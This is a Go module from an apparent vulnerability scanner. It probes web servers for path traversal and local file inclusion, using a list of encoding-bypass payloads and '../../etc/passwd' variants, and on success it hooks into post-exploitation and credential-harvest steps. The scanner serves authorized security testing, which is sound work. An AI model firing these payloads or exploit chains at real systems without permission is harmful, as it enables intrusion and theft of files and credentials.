// Package pathtraversal tests for framework-specific path traversal bypasses
// that exploit URL normalization differences between reverse proxies and
// application servers.
//
// Different frameworks normalize paths differently:
//   - Spring Boot: ..;/ (path parameter bypass)//   - Tomcat: /%2e%2e/ (double-encoded dot)
//   - Express/Node: %2F..%2F (encoded slash)
//   - Rails: ..%00/ (null byte truncation in older versions)
//   - IIS: ..%5C (backslash traversal)
//   - Nginx: ..%252f (double URL encoding)
//
// Deep mode only — sends traversal payloads.
package pathtraversal

import (
	"context"
	"fmt"
	"io"
	"net/http"
	"strings"
	"time"

	"github.com/stormbane-security/beacon/internal/finding"
	"github.com/stormbane-security/beacon/internal/module"
	"github.com/stormbane-security/beacon/internal/postexploit"
	"github.com/stormbane-security/beacon/internal/scan"
	"github.com/stormbane-security/beacon/internal/scanner/authctx"
	"github.com/stormbane-security/beacon/internal/scanner/paramdiscovery"
	"github.com/stormbane-security/beacon/internal/scanner/schemedetect"
)


func init() {
	scan.RegisterWithCheckDecls(scannerName, func(_ scan.ScannerConfig) scan.Scanner {
		return New()
	},
		scan.Check(finding.CheckExploitCredentialHarvest, finding.SeverityCritical, finding.ModeDeep),
		scan.Check(finding.CheckExploitDataExtracted, finding.SeverityCritical, finding.ModeDeep),
		scan.Check(finding.CheckWebPathTraversal, finding.SeverityHigh, finding.ModeDeep),
	)
}
const scannerName = "pathtraversal"

// traversal holds a framework-specific path traversal payload.
type traversal struct {
	framework string
	// prefix is prepended to a known-protected path to attempt traversal.
	prefix string
}

var traversals = []traversal{
	{"Spring Boot", "/..;/"},
	{"Spring Boot", "/%2e%2e/"},
	{"Spring Boot", "/..%3B/"},
	{"Tomcat/Java", "/%2e%2e%2f"},
	{"IIS", "/..%5C"},
	{"IIS", "/%2e%2e%5c"},
	{"Generic", "/..%252f"},
	{"Generic", "/%c0%ae%c0%ae/"},
	{"Node/Express", "/%2F..%2F"},
	{"Generic", "/..%00/"},
}

// protectedPaths to try traversing out of.
var protectedPaths = []string{
	"/api/internal",
	"/admin",
	"/manage",
	"/actuator",
}

// lfiPaths are endpoints that commonly accept file parameters.
var lfiPaths = []struct {
	path   string
	params []string
}{
	{"/", []string{"file", "path", "page", "template", "include", "doc", "load"}},
	{"/view", []string{"file", "path", "page", "name"}},
	{"/read", []string{"file", "path", "name"}},
	{"/download", []string{"file", "path", "name"}},
	{"/include", []string{"file", "path", "page"}},
	{"/template", []string{"file", "name", "path"}},
	{"/api/file", []string{"path", "name"}},
	{"/api/read", []string{"file", "path"}},
	{"/api/download", []string{"file", "path"}},
	{"/static", []string{"file", "path"}},
	{"/assets", []string{"file", "path"}},
	{"/render", []string{"file", "template", "path"}},
}

// lfiPayloads are path traversal payloads for parameter-based LFI.
var lfiPayloads = []string{
	"../../../../../../etc/passwd",
	"....//....//....//....//etc/passwd",
	"..%2f..%2f..%2f..%2fetc%2fpasswd",
	"..%252f..%252f..%252fetc%252fpasswd",
	"/etc/passwd",
}

// sensitiveTargets — if traversal reaches these, it confirms the bypass.
// All lowercase because they are compared against strings.ToLower(body).
var sensitiveTargets = []string{
	"/etc/passwd",
	"actuator",
	"web-inf",
	"web.xml",
}

type Scanner struct{}

func New() *Scanner { return &Scanner{} }

func (s *Scanner) Name() string { return scannerName }

func (s *Scanner) Run(ctx context.Context, asset string, scanType module.ScanType) ([]finding.Finding, error) {
	if scanType != module.ScanDeep && scanType != module.ScanAuthorized {
		return nil, nil
	}

	client := &http.Client{
		Timeout: 10 * time.Second,
		CheckRedirect: func(*http.Request, []*http.Request) error {
			return http.ErrUseLastResponse
		},
	}
	if c := authctx.HTTPClient(ctx); c != nil {
		client = c
	}

	base := schemedetect.Base(ctx, client, asset)
	var findings []finding.Finding

	// Merge discovered paths from crawl results into the protected paths list
	// and LFI paths for traversal testing.
	effectiveProtectedPaths := protectedPaths
	effectiveLFIPaths := lfiPaths
	if discovered := paramdiscovery.DiscoveredParamsFromContext(ctx); len(discovered) > 0 {
		effectiveProtectedPaths, effectiveLFIPaths = mergeDiscoveredPathTraversal(protectedPaths, lfiPaths, discovered)
	}

	for _, path := range effectiveProtectedPaths {
		if ctx.Err() != nil {
			break
		}

		url := base + path

		// Baseline: check if the path is protected (403/401) or exists (200).
		getReq, err := http.NewRequestWithContext(ctx, http.MethodGet, url, nil)
		if err != nil {
			continue
		}
		getReq.Header.Set("User-Agent", "Mozilla/5.0 (compatible; BeaconScanner)")
		getResp, err := client.Do(getReq)
		if err != nil {
			continue
		}
		_, _ = io.Copy(io.Discard, getResp.Body)
		_ = getResp.Body.Close()
		baseStatus := getResp.StatusCode

		// Try each traversal payload.
		for _, t := range traversals {
			if ctx.Err() != nil {
				break
			}

			// Build traversal URL: base + traversal_prefix + path_suffix
			// e.g., http://target/..;/admin or http://target/api/internal/..;/actuator
			traversalURL := base + t.prefix + strings.TrimPrefix(path, "/")
			req, err := http.NewRequestWithContext(ctx, http.MethodGet, traversalURL, nil)
			if err != nil {
				continue
			}
			req.Header.Set("User-Agent", "Mozilla/5.0 (compatible; BeaconScanner)")
			resp, err := client.Do(req)
			if err != nil {
				continue
			}
			body, _ := io.ReadAll(io.LimitReader(resp.Body, 16*1024))
			_ = resp.Body.Close()

			// Detection: response status changed from 403→200, OR body contains
			// sensitive content not present in the baseline.
			bypassed := false
			if baseStatus == 403 || baseStatus == 401 {
				if resp.StatusCode >= 200 && resp.StatusCode < 300 {
					bypassed = true
				}
			}
			// Also check if body contains sensitive content even if base was 200
			// (different content = traversed to a different path).
			bodyStr := strings.ToLower(string(body))
			for _, target := range sensitiveTargets {
				if strings.Contains(bodyStr, target) {
					bypassed = true
					break
				}
			}

			if bypassed {
				findings = append(findings, finding.Finding{
					CheckID:  finding.CheckWebPathTraversal,
					Module:   "deep",
					Scanner:  scannerName,
					Severity: finding.SeverityHigh,
					Title: fmt.Sprintf("Path traversal via %s normalization bypass on %s",
						t.framework, path),
					Description: fmt.Sprintf(
						"The server at %s is vulnerable to path traversal using %s-style "+
							"URL normalization. The path %q returns status %d, but %q returns "+
							"status %d, indicating the traversal payload bypasses path-based "+
							"access controls. This can expose internal endpoints, configuration "+
							"files, or application source code.",
						asset, t.framework, path, baseStatus, t.prefix+strings.TrimPrefix(path, "/"),
						resp.StatusCode),
					Asset: asset,
					ProofCommand: fmt.Sprintf("curl -si '%s'", traversalURL),
					Evidence: map[string]any{
						"framework":       t.framework,
						"traversal":       t.prefix,
						"base_path":       path,
						"base_status":     baseStatus,
						"traversal_url":   traversalURL,
						"traversal_status": resp.StatusCode,
						"body_snippet":    string(body[:min(len(body), 200)]),
					},
					DiscoveredAt: time.Now(),
				})

				// Post-exploitation: read sensitive files via same traversal
				postFindings := postExploit(ctx, client, asset, base, t.prefix)
				findings = append(findings, postFindings...)

				break // one traversal per path is enough
			}
		}
	}

	// Web exploit dispatcher: run post-exploit chains with per-module approval.
	if scanType == module.ScanAuthorized && len(findings) > 0 {
		dispatcher := postexploit.NewWebExploitDispatcher()
		approveFunc := postexploit.ApproveFuncFromContext(ctx)
		fb := &postexploit.FindingBuilder{
			Module:  "deep",
			Scanner: scannerName,
			Asset:   asset,
		}
		for _, f := range findings {
			if ctx.Err() != nil {
				break
			}
			if dispatcher.CanExploit(f.CheckID) {
				if approveFunc == nil || !approveFunc("web-exploit-"+string(f.CheckID), asset, 0) {
					continue
				}
				exploitFindings := dispatcher.Dispatch(ctx, f, fb)
				findings = append(findings, exploitFindings...)
			}
		}
	}

	// Parameter-based Local File Inclusion (LFI) probing.
	// Tests endpoints that accept file/path parameters for traversal.
	for _, lfi := range effectiveLFIPaths {
		if ctx.Err() != nil {
			break
		}
		lfiURL := base + lfi.path
		// Check if the endpoint exists at all. A 404 on the path itself
		// (without params) means the endpoint doesn't exist. But a 404 with
		// a param like ?file=test is normal for file inclusion endpoints
		// (file not found ≠ endpoint not found). So only skip if the base
		// path without params returns 404.
		checkReq, err := http.NewRequestWithContext(ctx, http.MethodGet, lfiURL, nil)
		if err != nil {
			continue
		}
		checkResp, err := client.Do(checkReq)
		if err != nil {
			continue
		}
		_, _ = io.Copy(io.Discard, checkResp.Body)
		_ = checkResp.Body.Close()
		// Only skip if the endpoint itself doesn't exist (not the file param)
		if checkResp.StatusCode == 404 || checkResp.StatusCode == 405 {
			continue
		}

		for _, param := range lfi.params {
			for _, payload := range lfiPayloads {
				if ctx.Err() != nil {
					break
				}
				tryURL := fmt.Sprintf("%s%s?%s=%s", base, lfi.path, param, payload)
				req, err := http.NewRequestWithContext(ctx, http.MethodGet, tryURL, nil)
				if err != nil {
					continue
				}
				resp, err := client.Do(req)
				if err != nil {
					continue
				}
				body, _ := io.ReadAll(io.LimitReader(resp.Body, 8192))
				_ = resp.Body.Close()
				bodyStr := strings.ToLower(string(body))

				if resp.StatusCode == 200 && strings.Contains(bodyStr, "root:") {
					findings = append(findings, finding.Finding{
						CheckID:     finding.CheckWebPathTraversal,
						Module:      "deep",
						Scanner:     scannerName,
						Severity:    finding.SeverityHigh,
						Asset:       asset,
						Title:       fmt.Sprintf("Local File Inclusion via %s parameter on %s%s", param, asset, lfi.path),
						Description: fmt.Sprintf("The %s parameter on %s is vulnerable to path traversal. The payload '%s' successfully read /etc/passwd.", param, tryURL, payload),
						DeepOnly:    true,
						ProofCommand: fmt.Sprintf(`curl -s "%s"`, tryURL),
						Evidence: map[string]any{
							"url":       tryURL,
							"path":      lfi.path,
							"parameter": param,
							"payload":   payload,
							"method":    "parameter-lfi",
						},
						Confidence:   finding.ConfidenceVerified,
						DiscoveredAt: time.Now(),
					})
					goto nextLFIPath // one finding per path is enough
				}
			}
		}
	nextLFIPath:
	}

	return findings, nil
}

// mergeDiscoveredPathTraversal combines hardcoded protected paths and LFI paths
// with paths discovered from crawl results.
func mergeDiscoveredPathTraversal(
	hardcodedProtected []string,
	hardcodedLFI []struct{ path string; params []string },
	discovered map[string][]string,
) ([]string, []struct{ path string; params []string }) {
	// Expand protected paths with discovered paths.
	protectedSet := make(map[string]bool, len(hardcodedProtected))
	for _, p := range hardcodedProtected {
		protectedSet[p] = true
	}
	protPaths := make([]string, len(hardcodedProtected))
	copy(protPaths, hardcodedProtected)

	// Expand LFI paths with discovered path+param combos.
	lfi := make([]struct{ path string; params []string }, len(hardcodedLFI))
	lfiIdx := make(map[string]int, len(hardcodedLFI))
	for i, pp := range hardcodedLFI {
		params := make([]string, len(pp.params))
		copy(params, pp.params)
		lfi[i] = struct{ path string; params []string }{path: pp.path, params: params}
		lfiIdx[pp.path] = i
	}

	for path, newParams := range discovered {
		// Add to protected paths if it looks like an admin/internal path.
		if !protectedSet[path] {
			protPaths = append(protPaths, path)
			protectedSet[path] = true
		}
		// Add to LFI paths with discovered params.
		if idx, ok := lfiIdx[path]; ok {
			existing := make(map[string]bool, len(lfi[idx].params))
			for _, p := range lfi[idx].params {
				existing[p] = true
			}
			for _, p := range newParams {
				if !existing[p] {
					lfi[idx].params = append(lfi[idx].params, p)
				}
			}
		} else {
			lfi = append(lfi, struct{ path string; params []string }{path: path, params: newParams})
		}
	}
	return protPaths, lfi
}
